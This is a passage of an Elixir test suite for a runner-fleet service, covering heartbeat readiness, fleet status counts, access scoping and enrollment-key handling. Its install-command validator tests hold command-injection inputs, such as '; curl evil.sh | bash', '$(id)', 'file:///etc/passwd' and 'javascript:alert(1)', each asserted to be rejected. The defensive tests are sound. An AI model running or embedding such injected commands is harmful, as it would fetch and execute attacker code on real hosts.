      assert readiness.action_load == 2
    end

    test "a stale heartbeat is advisory — the runner stays online and dispatchable", %{now: now} do
      runner = %Runner{
        online?: true,
        last_connected_at: DateTime.add(now, -600, :second),
        last_heartbeat_at: DateTime.add(now, -120, :second)
      }

      readiness = Runners.runner_readiness(runner, now)

      assert readiness.heartbeat.state == :stale
      assert readiness.heartbeat.reason == :heartbeat_stale
      assert readiness.connection == %{state: :online, reason: :presence_online}
      assert readiness.portal_dispatch == %{state: :ready, reason: :online}
    end

    test "the exact 90s boundary is stale; a future heartbeat is fresh", %{now: now} do
      at_boundary = %Runner{online?: true, last_heartbeat_at: DateTime.add(now, -90, :second)}
      inside = %Runner{online?: true, last_heartbeat_at: DateTime.add(now, -89, :second)}
      ahead = %Runner{online?: true, last_heartbeat_at: DateTime.add(now, 30, :second)}

      assert Runners.runner_readiness(at_boundary, now).heartbeat.state == :stale
      assert Runners.runner_readiness(inside, now).heartbeat.state == :fresh
      assert Runners.runner_readiness(ahead, now).heartbeat.state == :fresh
    end

    test "an online runner that hasn't heartbeated yet is awaiting its first", %{now: now} do
      runner = %Runner{online?: true, last_connected_at: DateTime.add(now, -5, :second)}

      readiness = Runners.runner_readiness(runner, now)

      assert readiness.heartbeat.state == :awaiting_first
      assert readiness.heartbeat.reason == :awaiting_first_heartbeat
      assert readiness.heartbeat.at == nil
      assert readiness.heartbeat.connected_at == runner.last_connected_at
      assert readiness.portal_dispatch == %{state: :ready, reason: :online}
    end

    test "an offline runner queues, and its recent heartbeat is history not liveness", %{now: now} do
      # The heartbeat timestamp is minutes fresher than the stale threshold, but
      # presence says the socket is gone — only an online runner can be stale.
      runner = %Runner{
        online?: false,
        last_connected_at: DateTime.add(now, -600, :second),
        last_heartbeat_at: DateTime.add(now, -5, :second)
      }

      readiness = Runners.runner_readiness(runner, now)

      assert readiness.connection == %{state: :offline, reason: :presence_absent}
      assert readiness.heartbeat.state == :unavailable
      assert readiness.heartbeat.reason == :not_online
      assert readiness.heartbeat.at == runner.last_heartbeat_at
      assert readiness.portal_dispatch == %{state: :queueable, reason: :offline}
    end

    test "a never-connected runner is pending and queueable", %{now: now} do
      readiness = Runners.runner_readiness(%Runner{online?: false, last_connected_at: nil}, now)

      assert readiness.connection == %{state: :pending, reason: :never_connected}
      assert readiness.heartbeat.state == :unavailable
      assert readiness.portal_dispatch == %{state: :queueable, reason: :pending}
    end

    test "normalizes hostile action-load metadata to a non-negative count", %{now: now} do
      assert Runners.runner_readiness(%Runner{action_load: -1}, now).action_load == 0
      assert Runners.runner_readiness(%Runner{action_load: "many"}, now).action_load == 0
      assert Runners.runner_readiness(%Runner{action_load: 3}, now).action_load == 3
    end

    test "disabled takes precedence over a live socket and over signature enforcement", %{
      now: now
    } do
      runner = %Runner{
        online?: true,
        disabled_at: now,
        enforce_signatures: true,
        last_connected_at: DateTime.add(now, -600, :second)
      }

      readiness = Runners.runner_readiness(runner, now)

      assert readiness.connection == %{state: :disabled, reason: :disabled}
      assert readiness.signatures == %{mode: :signed_only, reason: :signature_required}
      assert readiness.heartbeat.state == :unavailable
      assert readiness.portal_dispatch == %{state: :blocked, reason: :disabled}
    end

    test "a signature-enforcing runner is blocked even while online and fresh", %{now: now} do
      runner = %Runner{
        online?: true,
        enforce_signatures: true,
        last_connected_at: DateTime.add(now, -600, :second),
        last_heartbeat_at: DateTime.add(now, -5, :second)
      }

      readiness = Runners.runner_readiness(runner, now)

      assert readiness.connection.state == :online
      assert readiness.heartbeat.state == :fresh
      assert readiness.signatures == %{mode: :signed_only, reason: :signature_required}
      assert readiness.portal_dispatch == %{state: :blocked, reason: :signature_required}
    end

    test "degraded packs are advisory — they never change the dispatch outcome", %{now: now} do
      degraded = [%{"pack" => "nginx", "reason" => "invalid manifest"}]

      runner = %Runner{
        online?: true,
        degraded_packs: degraded,
        last_connected_at: DateTime.add(now, -600, :second),
        last_heartbeat_at: DateTime.add(now, -5, :second)
      }

      readiness = Runners.runner_readiness(runner, now)

      assert readiness.degradation == %{
               state: :degraded,
               reason: :degraded_packs,
               packs: degraded
             }

      assert readiness.portal_dispatch == %{state: :ready, reason: :online}
    end

    test "defaults `now` to the current instant" do
      runner = %Runner{online?: true, last_heartbeat_at: DateTime.utc_now()}

      assert Runners.runner_readiness(runner).heartbeat.state == :fresh
    end
  end

  describe "fleet_status/2" do
    setup do
      %{now: ~U[2026-08-03 12:00:00.000000Z]}
    end

    test "an empty fleet counts zero and reads :empty", %{now: now} do
      status = Runners.fleet_status([], now)

      assert status.counts.total == 0
      assert status.counts.active == 0
      assert status.signature_mode == :empty
      assert status.reasons == [:fleet_empty]
    end

    test "connection and dispatch counts partition the whole list", %{now: now} do
      online = %Runner{online?: true, last_heartbeat_at: DateTime.add(now, -5, :second)}
      offline = %Runner{last_connected_at: DateTime.add(now, -600, :second)}
      pending = %Runner{}
      disabled = %Runner{disabled_at: now}

      status = Runners.fleet_status([online, offline, pending, disabled], now)

      assert status.counts.total == 4
      assert status.counts.active == 3
      assert status.counts.online == 1
      assert status.counts.offline == 1
      assert status.counts.pending == 1
      assert status.counts.disabled == 1
      assert status.counts.portal_ready == 1
      assert status.counts.portal_queueable == 2
      assert status.counts.portal_blocked == 1
    end

    test "reads no-runners-online once every active runner is disconnected", %{now: now} do
      connected_at = DateTime.add(now, -600, :second)
      runners = [%Runner{last_connected_at: connected_at}, %Runner{last_connected_at: nil}]

      status = Runners.fleet_status(runners, now)

      assert status.counts.online == 0
      assert :no_runners_online in status.reasons
      refute :runners_online in status.reasons
    end

    test "a fleet of only disabled runners is neither online nor all-offline", %{now: now} do
      status = Runners.fleet_status([%Runner{disabled_at: now}], now)

      assert status.counts.total == 1
      assert status.counts.active == 0
      assert status.signature_mode == :empty
      assert status.reasons == []
    end

    test "every active runner enforcing reads :signed_only", %{now: now} do
      runners = [
        %Runner{enforce_signatures: true, last_connected_at: DateTime.add(now, -60, :second)},
        %Runner{enforce_signatures: true, last_connected_at: DateTime.add(now, -60, :second)}
      ]

      status = Runners.fleet_status(runners, now)

      assert status.counts.signed_only == 2
      assert status.signature_mode == :signed_only
      assert :fleet_signed_only in status.reasons
    end

    test "one plain runner beside an enforcing one reads :mixed", %{now: now} do
      connected_at = DateTime.add(now, -60, :second)

      runners = [
        %Runner{enforce_signatures: true, last_connected_at: connected_at},
        %Runner{last_connected_at: connected_at}
      ]

      status = Runners.fleet_status(runners, now)

      assert status.counts.signed_only == 1
      assert status.signature_mode == :mixed
      assert :mixed_signature_modes in status.reasons
      refute :fleet_signed_only in status.reasons
    end

    test "no enforcing runner reads :unsigned_allowed", %{now: now} do
      status = Runners.fleet_status([%Runner{last_connected_at: now}], now)

      assert status.counts.signed_only == 0
      assert status.signature_mode == :unsigned_allowed
    end

    test "a disabled non-enforcing runner doesn't keep the fleet from reading signed-only", %{
      now: now
    } do
      runners = [
        %Runner{enforce_signatures: true, last_connected_at: DateTime.add(now, -60, :second)},
        %Runner{disabled_at: now}
      ]

      assert Runners.fleet_status(runners, now).signature_mode == :signed_only
    end

    test "stale and degraded counts cover the active runners only", %{now: now} do
      stale = %Runner{online?: true, last_heartbeat_at: DateTime.add(now, -120, :second)}

      degraded = %Runner{
        online?: true,
        last_heartbeat_at: DateTime.add(now, -5, :second),
        degraded_packs: [
          %{"pack" => "nginx", "reason" => "invalid manifest"},
          %{"pack" => "redis", "reason" => "unreadable"}
        ]
      }

      disabled_degraded = %Runner{
        disabled_at: now,
        degraded_packs: [%{"pack" => "postgres", "reason" => "invalid manifest"}]
      }

      status = Runners.fleet_status([stale, degraded, disabled_degraded], now)

      assert status.counts.stale == 1
      assert status.counts.degraded == 1
      assert status.counts.degraded_packs == 2
      assert :stale_heartbeats in status.reasons
      assert :degraded_packs in status.reasons
    end

    test "defaults `now` to the current instant" do
      runner = %Runner{online?: true, last_heartbeat_at: DateTime.utc_now()}

      assert Runners.fleet_status([runner]).counts.stale == 0
    end
  end

  describe "fetch_fleet_status/2" do
    test "projects every scoped connection state into the fleet counts" do
      {account, _user, subject} = account_with_owner_subject()
      other_account = Fixtures.Accounts.create_account()

      Fixtures.Runners.create_runner(account_id: account.id, name: "online", connected?: true)

      offline =
        Fixtures.Runners.create_runner(account_id: account.id, name: "offline", connected?: true)

      :ok = Presence.untrack(self(), Presence.topic(account.id), offline.id)

      Fixtures.Runners.create_runner(account_id: account.id, name: "pending", connected?: false)

      disabled =
        Fixtures.Runners.create_runner(
          account_id: account.id,
          name: "disabled",
          connected?: false
        )

      {:ok, _disabled} = Runners.disable_runner(disabled, subject)
      Fixtures.Runners.create_runner(account_id: other_account.id, connected?: true)

      assert {:ok, status} = Runners.fetch_fleet_status(subject)

      assert status.counts.total == 4
      assert status.counts.active == 3
      assert status.counts.online == 1
      assert status.counts.offline == 1
      assert status.counts.pending == 1
      assert status.counts.disabled == 1
      assert :runners_online in status.reasons

      # A never-connected runner queues exactly like a disconnected one — the
      # portal accepts the dispatch and delivers it on the first connect.
      assert status.counts.portal_ready == 1
      assert status.counts.portal_queueable == 2
      assert status.counts.portal_blocked == 1
    end

    test "counts the signed and degraded posture of the active fleet" do
      {account, _user, subject} = account_with_owner_subject()

      Fixtures.Runners.create_runner(
        account_id: account.id,
        name: "signed",
        enforce_signatures: true,
        connected?: true
      )

      degraded =
        Fixtures.Runners.create_runner(account_id: account.id, name: "degraded", connected?: true)

      Fixtures.Runners.advertise_degraded_packs(degraded, [
        %{"pack" => "nginx", "reason" => "invalid manifest"},
        %{"pack" => "redis", "reason" => "unreadable"}
      ])

      parked =
        Fixtures.Runners.create_runner(account_id: account.id, name: "parked", connected?: false)

      Fixtures.Runners.advertise_degraded_packs(parked, [
        %{"pack" => "postgres", "reason" => "invalid manifest"}
      ])

      {:ok, _parked} = Runners.disable_runner(parked, subject)

      assert {:ok, status} = Runners.fetch_fleet_status(subject)

      assert status.counts.signed_only == 1
      # The disabled runner's skipped pack is not actionable, so it stays out.
      assert status.counts.degraded == 1
      assert status.counts.degraded_packs == 2
      assert status.signature_mode == :mixed
      assert :degraded_packs in status.reasons

      # Signed-only blocks beside the disabled runner; the plain online one is
      # the only immediately dispatchable host.
      assert status.counts.portal_ready == 1
      assert status.counts.portal_queueable == 0
      assert status.counts.portal_blocked == 2
    end

    test "another account's signed fleet never reaches these counts" do
      {_account, _user, subject} = account_with_owner_subject()
      other_account = Fixtures.Accounts.create_account()

      Fixtures.Runners.create_runner(
        account_id: other_account.id,
        enforce_signatures: true,
        connected?: false
      )

      assert {:ok, status} = Runners.fetch_fleet_status(subject)

      assert status.counts.total == 0
      assert status.signature_mode == :empty
      assert status.reasons == [:fleet_empty]
    end

    test "restricted runner access hides a signed, degraded runner from the fleet posture" do
      {account, _owner, _owner_subject} = account_with_owner_subject()

      in_scope =
        Fixtures.Runners.create_runner(account_id: account.id, name: "visible", connected?: false)

      hidden =
        Fixtures.Runners.create_runner(
          account_id: account.id,
          name: "hidden",
          enforce_signatures: true,
          connected?: false
        )

      Fixtures.Runners.advertise_degraded_packs(hidden, [
        %{"pack" => "nginx", "reason" => "invalid manifest"}
      ])

      operator = Fixtures.Users.create_user()

      membership =
        Fixtures.Memberships.create_membership(
          account_id: account.id,
          user_id: operator.id,
          role: "operator"
        )

      {:ok, access} = RunnerAccess.restricted([], [in_scope.id])
      Fixtures.Memberships.force_runner_access(membership, access)
      subject = Fixtures.Subjects.membership_subject(membership)

      assert {:ok, status} = Runners.fetch_fleet_status(subject)

      assert status.counts.total == 1
      assert status.counts.signed_only == 0
      assert status.counts.degraded == 0
      assert status.signature_mode == :unsigned_allowed
      refute :fleet_signed_only in status.reasons
      refute :degraded_packs in status.reasons
    end

    test "a stale heartbeat surfaces beside an online runner it doesn't unseat" do
      {account, _user, subject} = account_with_owner_subject()
      runner = Fixtures.Runners.create_runner(account_id: account.id, connected?: true)

      {:ok, _ref} =
        Runners.record_heartbeat(
          account.id,
          runner.id,
          runner.connection_generation,
          runner.connection_lease_id,
          0
        )

      later = DateTime.add(DateTime.utc_now(), 120, :second)

      assert {:ok, status} = Runners.fetch_fleet_status(subject, now: later)

      assert status.counts.online == 1
      assert status.counts.stale == 1
      assert :runners_online in status.reasons
      assert :stale_heartbeats in status.reasons
    end

    test "overlapping Presence metas use the newest heartbeat regardless of list order" do
      {account, _user, subject} = account_with_owner_subject()
      topic = Presence.topic(account.id)
      now = ~U[2026-08-03 12:00:00Z]
      stale = DateTime.to_unix(DateTime.add(now, -120, :second))
      fresh = DateTime.to_unix(DateTime.add(now, -10, :second))

      first = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)
      second = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)
      awaiting = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)

      track_presence_meta(topic, first.id, %{connection_generation: 1, last_heartbeat_at: stale})
      track_presence_meta(topic, first.id, %{connection_generation: 1, last_heartbeat_at: fresh})
      track_presence_meta(topic, second.id, %{connection_generation: 1, last_heartbeat_at: fresh})
      track_presence_meta(topic, second.id, %{connection_generation: 1, last_heartbeat_at: stale})

      # A reclaimed connection's higher generation wins even before its first
      # heartbeat; the superseded socket must not make the new one look stale.
      track_presence_meta(topic, awaiting.id, %{
        connection_generation: 1,
        last_heartbeat_at: stale
      })

      track_presence_meta(topic, awaiting.id, %{
        connection_generation: 2,
        last_heartbeat_at: nil
      })

      assert {:ok, status} = Runners.fetch_fleet_status(subject, now: now)
      assert status.counts.online == 3
      assert status.counts.stale == 0
    end

    test "overlapping all-stale metas count once and an invalid Unix value stays non-crashing" do
      {account, _user, subject} = account_with_owner_subject()
      topic = Presence.topic(account.id)
      now = ~U[2026-08-03 12:00:00Z]
      stale = DateTime.to_unix(DateTime.add(now, -120, :second))
      older = DateTime.to_unix(DateTime.add(now, -180, :second))

      stale_runner = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)
      invalid_runner = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)

      track_presence_meta(topic, stale_runner.id, %{
        connection_generation: 1,
        last_heartbeat_at: stale
      })

      track_presence_meta(topic, stale_runner.id, %{
        connection_generation: 1,
        last_heartbeat_at: older
      })

      track_presence_meta(topic, invalid_runner.id, %{
        connection_generation: 1,
        last_heartbeat_at: 1_208_925_819_614_629_174_706_176
      })

      assert {:ok, status} = Runners.fetch_fleet_status(subject, now: now)
      assert status.counts.online == 2
      assert status.counts.stale == 1

      assert {:ok, runners, _meta} = Runners.list_runners_for_account(subject)
      assert Enum.find(runners, &(&1.id == invalid_runner.id)).last_heartbeat_at == nil
    end

    test "a suspended membership fails closed — no runner reaches the counts" do
      {account, _owner, _owner_subject} = account_with_owner_subject()
      Fixtures.Runners.create_runner(account_id: account.id, connected?: true)

      member = Fixtures.Users.create_user()

      membership =
        Fixtures.Memberships.create_membership(
          account_id: account.id,
          user_id: member.id,
          role: "operator"
        )

      subject = Fixtures.Subjects.membership_subject(membership)
      Fixtures.Memberships.suspend_membership(membership)

      assert {:ok, status} = Runners.fetch_fleet_status(subject)

      assert status.counts.total == 0
      assert status.reasons == [:fleet_empty]
    end

    test "rejects a subject without view permission" do
      account = Fixtures.Accounts.create_account()
      no_view = %Subject{account: account, role: :runner, permissions: MapSet.new()}

      assert Runners.fetch_fleet_status(no_view) == {:error, :unauthorized}
    end

    test "rejects a subject with no account" do
      assert Runners.fetch_fleet_status(%Subject{}) == {:error, :unauthorized}
    end
  end

  describe "fleet_all_offline?/1" do
    setup do
      {_user, account, subject} = Fixtures.Subjects.owner_subject()
      %{account: account, subject: subject}
    end

    test "true when there are billable runners and every one is offline", %{
      account: account,
      subject: subject
    } do
      _r1 = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)
      _r2 = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)

      assert Runners.fleet_all_offline?(subject)
    end

    test "false when at least one runner is online", %{account: account, subject: subject} do
      _offline = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)
      online = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)
      {:ok, _} = Runners.connect_runner(online)

      refute Runners.fleet_all_offline?(subject)
    end

    test "false when the account has no billable runners (nothing to alert on)", %{
      subject: subject
    } do
      refute Runners.fleet_all_offline?(subject)
    end

    test "false (no badge) for a subject without view_runners", %{account: account} do
      _r = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)
      # An in-account subject that holds no permissions — exercises the gate's
      # deny branch directly (no membership role actually lacks view_runners, so
      # the realistic no-badge caller is a runner/system subject, not a UI user).
      no_view = %Subject{account: account, role: :runner, permissions: MapSet.new()}

      refute Runners.fleet_all_offline?(no_view)
    end

    test "false for a subject with no account" do
      refute Runners.fleet_all_offline?(%Subject{})
    end
  end

  describe "any_runners?/1" do
    test "false on an empty fleet, true once a runner exists, false without permission" do
      {account, _user, subject} = account_with_owner_subject()
      refute Runners.any_runners?(subject)

      Fixtures.Runners.create_runner(account_id: account.id)
      assert Runners.any_runners?(subject)

      viewer_user = Fixtures.Users.create_user()

      membership =
        Fixtures.Memberships.create_membership(
          account_id: account.id,
          user_id: viewer_user.id,
          role: "viewer"
        )

      viewer = Fixtures.Subjects.membership_subject(membership)
      assert Runners.any_runners?(viewer)
    end

    test "a disabled runner is not an active one" do
      {account, _user, subject} = account_with_owner_subject()
      runner = Fixtures.Runners.create_runner(account_id: account.id)
      {:ok, _disabled} = Runners.disable_runner(runner, subject)

      refute Runners.any_runners?(subject)
    end

    test "another account's fleet never answers for this one" do
      {_account, _user, subject} = account_with_owner_subject()
      other_account = Fixtures.Accounts.create_account()
      Fixtures.Runners.create_runner(account_id: other_account.id)

      refute Runners.any_runners?(subject)
    end

    test "restricted runner access answers only for the runners in scope" do
      {account, _owner, _owner_subject} = account_with_owner_subject()
      in_scope = Fixtures.Runners.create_runner(account_id: account.id, name: "visible")
      Fixtures.Runners.create_runner(account_id: account.id, name: "hidden")

      operator = Fixtures.Users.create_user()

      membership =
        Fixtures.Memberships.create_membership(
          account_id: account.id,
          user_id: operator.id,
          role: "operator"
        )

      {:ok, access} = RunnerAccess.restricted([], [in_scope.id])
      Fixtures.Memberships.force_runner_access(membership, access)
      subject = Fixtures.Subjects.membership_subject(membership)

      assert Runners.any_runners?(subject)

      Fixtures.Memberships.suspend_membership(membership)
      refute Runners.any_runners?(subject)
    end

    test "false without view_runners" do
      account = Fixtures.Accounts.create_account()
      Fixtures.Runners.create_runner(account_id: account.id)
      no_view = %Subject{account: account, role: :runner, permissions: MapSet.new()}

      refute Runners.any_runners?(no_view)
    end
  end

  describe "enrollment_key_filters/0" do
    test "carries the enrollment-keys table's filters" do
      assert Enum.map(Runners.enrollment_key_filters(), & &1.name) == [:status]
    end
  end

  describe "list_enrollment_keys/2" do
    setup do
      {account, _user, subject} = account_with_owner_subject()
      %{account: account, subject: subject}
    end

    test "lists the FULL inventory — a wizard-minted install key is a live credential", %{
      subject: subject
    } do
      {:ok, _, wizard} = Runners.mint_install_key(subject)
      {:ok, _, manual} = Runners.create_enrollment_key(%{reusable: true}, subject)

      # Both are live, root-capable credentials; hiding the auto-minted one
      # under-reported the very list an operator audits (and the only place
      # it can be revoked pre-use).
      assert {:ok, keys, _} = Runners.list_enrollment_keys(subject)
      assert keys |> Enum.map(& &1.id) |> Enum.sort() == Enum.sort([wizard.id, manual.id])
    end

    test "the status filter hides or shows revoked keys", %{subject: subject} do
      {:ok, _, active} = Runners.create_enrollment_key(%{reusable: true}, subject)
      {:ok, _, revoked} = Runners.create_enrollment_key(%{reusable: true}, subject)
      {:ok, _} = Runners.revoke_enrollment_key(revoked, subject)

      # No status filter → both keys.
      assert {:ok, both, _} = Runners.list_enrollment_keys(subject)
      assert length(both) == 2

      # status=active → only the live key.
      assert {:ok, [%EnrollmentKey{id: id}], _} =
               Runners.list_enrollment_keys(subject, filter: [status: ["active"]])

      assert id == active.id

      # status=revoked → only the revoked key.
      assert {:ok, [%EnrollmentKey{id: id}], _} =
               Runners.list_enrollment_keys(subject, filter: [status: ["revoked"]])

      assert id == revoked.id
    end

    test "is account-scoped — another account's keys don't leak in", %{subject: subject} do
      {:ok, _, _mine} = Runners.create_enrollment_key(%{reusable: true}, subject)
      {_other, _u, other_subject} = account_with_owner_subject()
      {:ok, _, _theirs} = Runners.create_enrollment_key(%{reusable: true}, other_subject)

      assert {:ok, [_one], _} = Runners.list_enrollment_keys(subject)
    end

    test "a viewer (no manage_enrollment_keys) is refused", %{account: account} do
      assert {:error, :unauthorized} = Runners.list_enrollment_keys(viewer_subject_for(account))
    end
  end

  describe "change_enrollment_key/1" do
    test "builds a valid form changeset from the operator-facing fields (no DB write)" do
      changeset = Runners.change_enrollment_key(%{"description" => "for dev"})

      assert changeset.valid?
      assert changeset.changes == %{description: "for dev"}
      # It's a pure builder — no key was minted.
      refute Repo.exists?(EnrollmentKey.Query.all())
    end

    test "surfaces a validation error for the inline form (max_uses must be > 0)" do
      changeset = Runners.change_enrollment_key(%{"max_uses" => 0})

      refute changeset.valid?
      assert "must be greater than 0" in errors_on(changeset).max_uses
    end
  end

  describe "create_enrollment_key/2" do
    setup do
      {account, user, subject} = account_with_owner_subject()
      %{account: account, user: user, subject: subject}
    end

    test "returns a raw secret + persists the hash with a prefix", %{
      account: account,
      user: user,
      subject: subject
    } do
      assert {:ok, raw, %EnrollmentKey{} = key} =
               Runners.create_enrollment_key(%{description: "for dev"}, subject)

      assert String.starts_with?(raw, "emkey-enroll-")
      assert key.account_id == account.id
      assert key.created_by_id == user.id
      assert is_binary(key.key_hash)
      assert key.description == "for dev"
    end

    test "mints from the raw browser params the form posts", %{subject: subject} do
      params = %{
        "description" => "pool key",
        "reusable" => "true",
        "max_uses" => "5",
        "expires_at" => "2099-12-25T10:30"
      }

      assert {:ok, _raw, %EnrollmentKey{} = key} =
               Runners.create_enrollment_key(params, subject)

      assert key.description == "pool key"
      assert key.reusable
      assert key.max_uses == 5
      assert key.expires_at == ~U[2099-12-25 10:30:00.000000Z]
    end

    test "a single-use submission stores no max_uses", %{subject: subject} do
      params = %{"description" => "one shot", "reusable" => "false", "max_uses" => "5"}

      assert {:ok, _raw, %EnrollmentKey{} = key} =
               Runners.create_enrollment_key(params, subject)

      refute key.reusable
      assert is_nil(key.max_uses)
    end

    test "rejects max_uses: 0 at the write path, not just the form", %{subject: subject} do
      # max_uses 0 mints a key that's dead on arrival; create/5 must enforce
      # the same `> 0` guard the editor form does, not rely on it.
      assert {:error, %Ecto.Changeset{} = changeset} =
               Runners.create_enrollment_key(%{description: "dead", max_uses: 0}, subject)

      assert %{max_uses: ["must be greater than 0"]} = errors_on(changeset)
    end

    test "a malformed expiry mints nothing and audits nothing", %{subject: subject} do
      assert {:error, %Ecto.Changeset{} = changeset} =
               Runners.create_enrollment_key(%{"expires_at" => "25/12/2030"}, subject)

      assert "is invalid" in errors_on(changeset).expires_at
      refute Repo.exists?(EnrollmentKey.Query.all())
      assert Repo.all(Audit.Event) == []
    end

    test "a viewer (no manage_enrollment_keys) is refused", %{account: account} do
      assert {:error, :unauthorized} =
               Runners.create_enrollment_key(%{reusable: true}, viewer_subject_for(account))
    end
  end

  describe "enrollment_install_command/2" do
    # A syntactically real key (tag + 43 url-safe base64 chars) so the command
    # under test is byte-for-byte the one an operator pastes.
    @raw_secret "emkey-enroll-" <> String.duplicate("a", 43)

    test "builds the canonical one-liner, leading space included" do
      assert {:ok, command} =
               Runners.enrollment_install_command(@raw_secret, "https://emisar.dev")

      assert command ==
               " curl -sSL https://emisar.dev/install.sh | sudo EMISAR_ENROLLMENT_KEY=#{@raw_secret} EMISAR_URL=https://emisar.dev bash"

      # The leading space is load-bearing (HISTCONTROL=ignorespace), so it is
      # asserted on its own — a trim anywhere upstream leaks the key to history.
      assert String.starts_with?(command, " curl")
    end

    test "normalizes a single trailing slash off the base URL" do
      assert {:ok, command} =
               Runners.enrollment_install_command(@raw_secret, "https://emisar.dev/")

      assert command ==
               " curl -sSL https://emisar.dev/install.sh | sudo EMISAR_ENROLLMENT_KEY=#{@raw_secret} EMISAR_URL=https://emisar.dev bash"
    end

    test "a self-hosted http origin keeps its scheme and port" do
      assert {:ok, command} =
               Runners.enrollment_install_command(@raw_secret, "http://runners.internal:4000")

      assert command ==
               " curl -sSL http://runners.internal:4000/install.sh | sudo EMISAR_ENROLLMENT_KEY=#{@raw_secret} EMISAR_URL=http://runners.internal:4000 bash"
    end

    test "refuses a key that isn't the minted enrollment-key shape" do
      assert Runners.enrollment_install_command("emkey-enroll-short", "https://emisar.dev") ==
               {:error, :invalid_enrollment_key}

      assert Runners.enrollment_install_command(
               "emk-#{String.duplicate("a", 43)}",
               "https://emisar.dev"
             ) ==
               {:error, :invalid_enrollment_key}

      assert Runners.enrollment_install_command(
               "#{@raw_secret} ; curl evil.sh | bash",
               "https://emisar.dev"
             ) == {:error, :invalid_enrollment_key}

      assert Runners.enrollment_install_command("#{@raw_secret}\n", "https://emisar.dev") ==
               {:error, :invalid_enrollment_key}

      assert Runners.enrollment_install_command(nil, "https://emisar.dev") ==
               {:error, :invalid_enrollment_key}
    end

    test "refuses a base URL that is more than a plain http(s) origin" do
      for base <- [
            "https://emisar.dev; curl evil.sh | bash",
            "https://emisar.dev$(id)",
            "https://emisar.dev /install.sh",
            "https://user:pass@emisar.dev",
            "https://emisar.dev/enroll",
            "https://emisar.dev//",
            "https://emisar.dev?x=1",
            "https://emisar.dev#frag",
            "https://emisar.dev:99999",
            "file:///etc/passwd",
            "javascript:alert(1)",
            "emisar.dev",
            "",
            nil
          ] do
        assert Runners.enrollment_install_command(@raw_secret, base) ==
                 {:error, :invalid_base_url}
      end
    end
  end

  describe "subscribe_connections/1" do
    test "the subscriber receives this account's presence diffs" do
      account = Fixtures.Accounts.create_account()
      :ok = Runners.subscribe_connections(account.id)

      # Tracking a runner pushes a presence_diff on the topic just joined.
      # Phoenix.Presence broadcasts that diff asynchronously through a single
      # shared tracker and exposes no synchronous "diff delivered" hook, so under
      # parallel load it can land later than assert_receive's 100ms default —
      # this was the flake. assert_receive returns the instant the diff arrives,
      # so the wider bound only rules out the false failure; it is not a sleep.
      _ = Fixtures.Runners.create_runner(account_id: account.id, connected?: true)
      assert_receive %Phoenix.Socket.Broadcast{event: "presence_diff"}, 2_000
    end

    test "a subscriber to account A does not receive account B's presence diffs" do
      account_a = Fixtures.Accounts.create_account()
      account_b = Fixtures.Accounts.create_account()
      :ok = Runners.subscribe_connections(account_a.id)

      _ = Fixtures.Runners.create_runner(account_id: account_b.id, connected?: true)
      refute_receive %Phoenix.Socket.Broadcast{event: "presence_diff"}
    end
  end

  describe "subscribe_account_enrollment_keys/1" do
    test "the subscriber receives the account's enrollment-key list changes" do
      {account, _user, subject} = account_with_owner_subject()
      :ok = Runners.subscribe_account_enrollment_keys(account.id)

      {:ok, _raw, key} = Runners.create_enrollment_key(%{reusable: true}, subject)
      assert_receive {:list_changed, :enrollment_key, "enrollment_key.created", key_id}
      assert key_id == key.id
    end

    test "a subscriber to account A does not receive account B's enrollment-key changes" do
      {_account_a, _ua, _sa} = account_with_owner_subject()
      account_a = Fixtures.Accounts.create_account()
      {_account_b, _ub, subject_b} = account_with_owner_subject()
      :ok = Runners.subscribe_account_enrollment_keys(account_a.id)

      {:ok, _raw, _key} = Runners.create_enrollment_key(%{reusable: true}, subject_b)
      refute_receive {:list_changed, :enrollment_key, _event, _id}
    end
  end

  describe "subscribe_runner_transport/1" do
    test "the subscriber receives this runner's cloud→runner deliveries" do
      runner = Fixtures.Runners.create_runner(connected?: true)
      :ok = Runners.subscribe_runner_transport(runner)

      Runners.deliver_to_runner(
        runner.account_id,
        runner.id,
        runner.connection_generation,
        %{"hello" => "runner"}
      )

      assert_receive {:cloud_to_runner, _generation, %{"hello" => "runner"}}
    end

    test "a subscriber to runner A does not receive runner B's deliveries" do
      account = Fixtures.Accounts.create_account()
      runner_a = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)
      runner_b = Fixtures.Runners.create_runner(account_id: account.id, connected?: true)
      :ok = Runners.subscribe_runner_transport(runner_a)

      Runners.deliver_to_runner(
        account.id,
        runner_b.id,
        runner_b.connection_generation,
        %{"only" => "b"}
      )

      refute_receive {:cloud_to_runner, _generation, _msg}
    end
  end

  describe "deliver_to_runner/4" do
    test "pushes an envelope onto the runner's transport topic" do
      runner = Fixtures.Runners.create_runner(connected?: true)
      :ok = Runners.subscribe_runner_transport(runner)

      assert :ok =
               Runners.deliver_to_runner(
                 runner.account_id,
                 runner.id,
                 runner.connection_generation,
                 %{"cmd" => "dispatch"}
               )

      assert_receive {:cloud_to_runner, _generation, %{"cmd" => "dispatch"}}
    end

    test "the topic carries the account id — a wrong account never reaches the socket" do
      account = Fixtures.Accounts.create_account()
      other_account = Fixtures.Accounts.create_account()
      runner = Fixtures.Runners.create_runner(account_id: account.id, connected?: true)
      :ok = Runners.subscribe_runner_transport(runner)

      # Same runner id, wrong account → different topic → the subscriber hears nothing.
      Runners.deliver_to_runner(
        other_account.id,
        runner.id,
        runner.connection_generation,
        %{"cmd" => "x"}
      )

      refute_receive {:cloud_to_runner, _generation, _msg}
    end

    test "a disabled account cannot receive a queued runner envelope" do
      {account, _user, subject} = account_with_owner_subject()
      runner = Fixtures.Runners.create_runner(account_id: account.id, connected?: true)
      :ok = Runners.subscribe_runner_transport(runner)

      assert {:ok, _account} =
               Emisar.Accounts.set_account_disabled_for_support(
                 account.id,
                 true,
                 "Temporary hold",
                 subject
               )

      assert {:error, :not_connected} =
               Runners.current_connection_generation(account.id, runner.id)

      assert {:error, :not_connected} =
               Runners.deliver_to_runner(
                 account.id,
                 runner.id,
                 runner.connection_generation,
                 %{"cmd" => "late"}
               )

      refute_receive {:cloud_to_runner, _generation, _msg}
    end
  end

  describe "mint_install_key/2" do
    setup do
